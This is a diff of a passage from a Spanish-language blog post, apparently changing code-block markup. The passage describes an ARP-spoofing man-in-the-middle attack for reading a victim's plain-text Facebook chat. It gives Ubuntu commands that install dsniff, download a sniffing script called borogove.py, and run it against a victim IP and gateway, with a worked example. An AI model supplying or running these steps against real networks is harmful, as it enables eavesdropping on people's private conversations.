@@ -52,11 +52,15 @@ Lo que pretende Bob es "engañar" al Router y al PC de Alice, interfiriendo en s
 Una vez hecho esto, puede "inspeccionar" los paquetes que Alice envía o recibe en busca de conversaciones, sin que la víctima note nada (excepto, quizá, una conexión algo mas lenta). Dado que el chat de Facebook no funciona en HTTPS, se envía siempre en texto plano, lo qual es sumamente inseguro y permite este tipo de ataques.
 
 Para usarlo en Ubuntu seguid los siguientes pasos:
-[bash]sudo -s
+~~~bash
+sudo -s
 aptitude install dsniff python-pypcap python-dpkg
 wget http://borogove.googlecode.com/svn/trunk/borogove.py
 chmod +x borogove.py
-./borogove.py &amp;lt;interfaz&amp;gt; &amp;lt;IP_vicima&amp;gt; &amp;lt;gateway&amp;gt;[/bash]
+./borogove.py &amp;lt;interfaz&amp;gt; &amp;lt;IP_vicima&amp;gt; &amp;lt;gateway&amp;gt;
+~~~
 Por ejemplo, Bob lo usaría así:
-[bash]./borogove.py wlan0 192.168.1.22 192.168.1.1[/bash]
+~~~bash
+./borogove.py wlan0 192.168.1.22 192.168.1.1
+~~~
 Salud y ya sabéis, usar sólo para fines educativos y bajo vuestra responsabilidad.
